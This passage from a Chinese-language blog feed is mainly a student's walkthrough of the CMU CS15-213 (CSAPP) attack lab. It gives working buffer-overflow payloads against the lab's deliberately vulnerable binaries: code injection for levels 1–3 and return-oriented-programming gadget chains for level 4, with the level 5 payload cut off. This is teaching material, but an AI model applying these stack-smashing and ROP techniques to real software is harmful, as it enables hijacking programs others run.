evictions:3</span><br><span class="line">➜  cachelab-handout git:(master) ✗ cat 2.txt </span><br><span class="line">L 10,1 miss </span><br><span class="line">M 20,1 miss hit </span><br><span class="line">L 22,1 hit </span><br><span class="line">S 18,1 hit </span><br><span class="line">L 110,1 miss eviction </span><br><span class="line">L 210,1 miss eviction </span><br><span class="line">M 12,1 miss eviction hit </span><br><span class="line">hits:4 misses:5 evictions:3</span><br></pre></td></tr></table></figure><p>一切都一样。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;关于课程&quot;&gt;&lt;a href=&quot;#关于课程&quot; class=&quot;headerlink&quot; title=&quot;关于课程&quot;&gt;&lt;/a&gt;关于课程&lt;/h2&gt;&lt;p&gt;这门课程围绕 &lt;a href=&quot;https://book.douban.com/subject/26912767/&quot;&gt;CSA
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CS15-213labs:attack lab</title>
    <link href="http://yoursite.com/2020/09/25/CS15-213labs-attack-lab/"/>
    <id>http://yoursite.com/2020/09/25/CS15-213labs-attack-lab/</id>
    <published>2020-09-25T14:21:44.000Z</published>
    <updated>2020-09-26T09:35:41.049Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于课程"><a href="#关于课程" class="headerlink" title="关于课程"></a>关于课程</h2><p>这门课程围绕 <a href="https://book.douban.com/subject/26912767/">CSAPP</a> 展开。</p><p>书本相关的所有信息，你可以在 <a href="http://csapp.cs.cmu.edu/">这里</a> 找到。</p><p>你可以在 <a href="https://www.bilibili.com/video/BV1iW411d7hd?p=1">Bilibili</a> 或者 <a href="https://www.youtube.com/watch?v=4CpHpFu_KYM&list=PLQ5cMeVTtiJkUilq92Cw9D6RhAJhPJ_JX">YouTube</a> 查看所有的课程视频，Bilibili附带中文字幕。 </p><p>建议看完相应的章节然后去做相应的实验。大名鼎鼎的 CSAPP 的作者即是这门课程的讲师。你可以在 <a href="http://csapp.cs.cmu.edu/3e/labs.html">这里</a> 找到实验相关的所有内容。</p><p>这门课程的实验代码可以在我的 <a href="https://github.com/ArdxWe/CS15-213labs">Github</a> 找到我的所有解答及相关资料。本次实验相关代码在 ./attacklab-handout 文件夹下。</p><h2 id="attack-lab"><a href="#attack-lab" class="headerlink" title="attack lab"></a>attack lab</h2><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p>点击 <a href="http://csapp.cs.cmu.edu/3e/labs.html">这里</a>， 然后点击圆圈处 <img src="/images/attack-lab-1.png" alt="Self-Study Handout"> 即可下载此次实验对应的文档。</p><p>解压之后文件夹对应目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 tree attacklab-handout</span><br><span class="line">attacklab-handout</span><br><span class="line">└── target1</span><br><span class="line">    ├── cookie.txt</span><br><span class="line">    ├── ctarget</span><br><span class="line">    ├── farm.c</span><br><span class="line">    ├── hex2raw</span><br><span class="line">    ├── README.txt</span><br><span class="line">    └── rtarget</span><br><span class="line"></span><br><span class="line">1 directory, 6 files</span><br></pre></td></tr></table></figure><ul><li>cookie.txt: 4字节签名的文本文件</li><li>ctarget: 具有代码注入漏洞的Linux二进制文件,用于阶段作业的1-3</li><li>farm.c: 此rtarget实例中存在小工具场的源代码,可以编译（使用-Og标志）并反汇编以查找小工具,更多信息查看 <a href="https://github.com/ArdxWe/CS15-213labs/blob/master/attacklab-handout/attacklab.pdf">实验官方说明文件</a></li><li>hex2raw: 生成字节序列的实用程序。 更多信息查看 <a href="https://github.com/ArdxWe/CS15-213labs/blob/master/attacklab-handout/attacklab.pdf">实验官方说明文件</a></li><li>README.txt: 官方简单说明文件</li><li>rtarget: Linux二进制文件，具有面向返回的编程漏洞,用于分配的阶段4-5</li></ul><h3 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h3><p>为学生提供了一对独特的定制生成的x86-64二进制可执行文件，称为target，它们具有缓冲区溢出错误。</p><p>一个目标很容易受到代码注入攻击。另一个容易受到面向返回的编程攻击的攻击。</p><p>要求学生通过基于代码注入或面向返回的编程开发漏洞利用程序来修改目标的行为。该实验室向学生讲授堆栈规程，并教给他们写易受缓冲区溢出攻击的代码的危险。</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>LINUX</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>实验官方说明文件: <a href="https://github.com/ArdxWe/CS15-213labs/blob/master/attacklab-handout/attacklab.pdf">attacklab</a></p><p>运行 ctarget:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) ./ctarget       </span><br><span class="line">FAILED: Initialization error: Running on an illegal host [ardxwe]</span><br></pre></td></tr></table></figure><p>查阅相关资料知道需要加上 -q 标志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:</span><br></pre></td></tr></table></figure><p>一切正常。</p><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>毫无疑问，反汇编。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) objdump -d ctarget &gt; ctarget.s</span><br></pre></td></tr></table></figure><p>目标： getbuf 函数使用缓冲区溢出技术使程序执行 touch1 函数</p><p>首先查看 getbuf 函数汇编代码:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  4017ac:    <span class="number">48</span> <span class="number">89</span> e7                 <span class="keyword">mov</span>    %rsp,%rdi</span><br><span class="line">  4017af:    e8 8c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:    b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  4017b9:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>              <span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  4017bd:    c3                       retq   </span><br><span class="line">  4017be:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  4017bf:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br></pre></td></tr></table></figure><p>显然，栈指针 rsp 减去 0x28 作为缓冲区调用 Gets 函数，我们需要做的仅仅是用 touch1 函数虚拟地址覆盖返回地址即可。</p><p>查看 touch1 函数汇编代码:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  4017c4:    c7 <span class="number">05</span> 0e <span class="number">2d</span> <span class="number">20</span> <span class="number">00</span> <span class="number">01</span>     movl   <span class="number">$0</span>x1,<span class="number">0x202d0e</span>(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:    <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  4017ce:    bf c5 <span class="number">30</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4030c5,%edi</span><br><span class="line">  4017d3:    e8 e8 f4 ff ff           callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:    bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  4017<span class="built_in">dd</span>:    e8 ab <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>           callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:    bf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%edi</span><br><span class="line">  4017e7:    e8 <span class="number">54</span> f6 ff ff           callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>touch1 函数地址是 00000000004017c0, 栈地址可以通过 gdb 获取，不再赘述。所以答案应该是</p><p><img src="/images/attack-lab-2.jpg" alt="level1"></p><p>调用 Gets 之前，图中 old rsp 处存储上一个函数的地址 return address, 图中 rsp 所指的地址为当前 rsp 寄存器内容。</p><p>我们输入的字符会一直填充栈内存，前 0x28 字节任意填充，这里选择全 0 填充，后八个字节填充实际地址，因为 0x00 00 00 00 00 40 17 c0 最高字节为 00,所以只需要填前 7 个字节。</p><p>根据 C 语言机制，最后一个字节后面会填充为 0 ， 可以达到我们的目的。</p><p>后面理论上也可以填充任意字节，但是那无关紧要，我们使用最简单的字节序列达到结果即可。</p><p>查看 getbuf 汇编代码：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  4017ac:    <span class="number">48</span> <span class="number">89</span> e7                 <span class="keyword">mov</span>    %rsp,%rdi</span><br><span class="line">  4017af:    e8 8c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:    b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  4017b9:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>              <span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  4017bd:    c3                       retq   </span><br><span class="line">  4017be:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  4017bf:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br></pre></td></tr></table></figure><p>先执行第 3 行, 调用 Gets 函数，执行完毕，我们的输入已经填充栈内存</p><p>然后执行第 4 行， eax 置为 1</p><p>执行第 5 行，栈指针增加 0x28， 指向 old rsp</p><p>执行第 6 行， 执行 栈指针内存地址代码段，即 touch1，也就达到了我们的目的</p><p>实际填充字节：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) ✗ cat level1.txt                  </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">c0 17 40 00 00 00 00</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) cat level1.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00</span><br></pre></td></tr></table></figure><p>实际执行的命令方式如果你不懂，可以阅读 <a href="https://github.com/ArdxWe/CS15-213labs/blob/master/attacklab-handout/attacklab.pdf">attacklab</a></p><p>当然也可以 <a href="www.google.com">Google</a>, 查阅关于 Linux 管道，流，标准输入，标准输出，标准错误概念</p><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>目标：让 ctarget 执行 touch2 的代码，而不是返回 test。你必须造成的效果是：调用 touch2，传递 cookie 作为参数</p><p>查看 touch2 函数地址</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  4017f0:    <span class="number">89</span> fa                    <span class="keyword">mov</span>    %edi,%edx</span><br><span class="line">  4017f2:    c7 <span class="number">05</span> e0 2c <span class="number">20</span> <span class="number">00</span> <span class="number">02</span>     movl   <span class="number">$0</span>x2,<span class="number">0x202ce0</span>(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:    <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  4017fc:    3b <span class="number">3d</span> e2 2c <span class="number">20</span> <span class="number">00</span>        <span class="keyword">cmp</span>    <span class="number">0x202ce2</span>(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  <span class="number">401802</span>:    <span class="number">75</span> <span class="number">20</span>                    <span class="keyword">jne</span>    <span class="number">401824</span> &lt;touch2+<span class="number">0x38</span>&gt;</span><br><span class="line">  <span class="number">401804</span>:    be e8 <span class="number">30</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4030e8,%esi</span><br><span class="line">  <span class="number">401809</span>:    bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  40180e:    b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  <span class="number">401813</span>:    e8 d8 f5 ff ff           callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">401818</span>:    bf <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x2,%edi</span><br><span class="line">  <span class="number">40181d</span>:    e8 6b <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>           callq  401c8d &lt;validate&gt;</span><br><span class="line">  <span class="number">401822</span>:    eb 1e                    <span class="keyword">jmp</span>    <span class="number">401842</span> &lt;touch2+<span class="number">0x56</span>&gt;</span><br><span class="line">  <span class="number">401824</span>:    be <span class="number">10</span> <span class="number">31</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x403110,%esi</span><br><span class="line">  <span class="number">401829</span>:    bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  40182e:    b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  <span class="number">401833</span>:    e8 b8 f5 ff ff           callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">401838</span>:    bf <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x2,%edi</span><br><span class="line">  <span class="number">40183d</span>:    e8 <span class="number">0d</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  401d4f &lt;fail&gt;</span><br><span class="line">  <span class="number">401842</span>:    bf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%edi</span><br><span class="line">  <span class="number">401847</span>:    e8 f4 f5 ff ff           callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>调用 touch2 很简单，传递地址就行，但核心问题是如何传递参数</p><p>显然需要注入代码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">$0</span>x4017ec</span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x59b997fa, %edi</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p><img src="/images/attack-lab-3.jpg" alt="level2"></p><p>程序跳转到图中 rsp 处，执行栈内存代码</p><p>首先 push touch2 地址，touch2 地址 push 到 图中 old rsp 处</p><p>然后将立即数（我的cookie）给 edi 作为第一个参数</p><p>最后 ret 执行 touch2 代码段，完美</p><p>获取汇编代码的字节表示:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) ✗ gcc -c level2.s</span><br><span class="line">➜  target1 git:(master) ✗ objdump -d level2.o </span><br><span class="line"></span><br><span class="line">level2.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   68 ec 17 40 00          pushq  <span class="variable">$0x4017ec</span></span><br><span class="line">   5:   bf fa 97 b9 59          mov    <span class="variable">$0x59b997fa</span>,%edi</span><br><span class="line">   a:   c3                      retq</span><br></pre></td></tr></table></figure><p>实际填充字节:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) ✗ cat level2.txt</span><br><span class="line">68 ec 17 40 00 bf fa 97</span><br><span class="line">b9 59 c3 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) cat level2.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 BF FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 </span><br></pre></td></tr></table></figure><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>目标：让 ctarget 执行 touch3 代码。以 cookie 表示的字符串作为参数</p><p>和 level2 唯一不同的是我们需要传递指针，而且字符串本身需要自己填充</p><p>汇编代码:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">$0</span>x4018fa</span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x5561dca8, $<span class="built_in">edi</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>push touch3 函数 将字符串指针传递给 edi 寄存器， 返回，调用 touch3</p><p>这里将字符串传递到 old rsp 上方，可以保证在调用 touch3 完成不会被破坏</p><p>字节表示(注意字符串的字节表示):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) ✗ cat level3.txt</span><br><span class="line">68 fa 18 40 00 bf a8 dc</span><br><span class="line">61 55 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) ✗ cat level3.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:68 FA 18 40 00 BF A8 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 </span><br></pre></td></tr></table></figure><h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p>目的：使用制定范围内的两个小工具调用 touch2, 并传递 cookie 参数</p><p>小工具指：特定函数范围内某些汇编指令可以利用起来完成我们想要的功能</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">  400f15:          c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7        movl <span class="number">$0</span>xc78948d4, (%rdi)</span><br><span class="line">  400f1b:          c3                       retq</span><br></pre></td></tr></table></figure><p>48 89 c7 也是指令 movq %rax, %rdi 字节表示,我们可以通过填充指令地址，同时利用 ret 指令达到完成一些功能</p><p>字节表示:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) cat level4<span class="number">.</span>txt</span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>首先执行 0x4019ab 处代码,对应位置代码为</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq $<span class="built_in">rax</span></span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>将 cookie 赋给 rax 执行 rsp 处指令</p><p>0x 4019c5:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span> %rax, %rdi</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>cookie 送到 rdi，跳到 touch2， 完美</p><p>结果:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) cat level4.txt | ./hex2raw | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00</span><br></pre></td></tr></table></figure><h4 id="leve5"><a href="#leve5" class="headerlink" title="leve5"></a>leve5</h4><p>目的：执行 touch3 函数，将 cookie 字符串作为参数</p><p>此处程序本身使用栈指针随机化技术，每次 rsp 值不固定,所以需要记录 rsp</p><p>实际字节：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) cat level5.txt                           </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 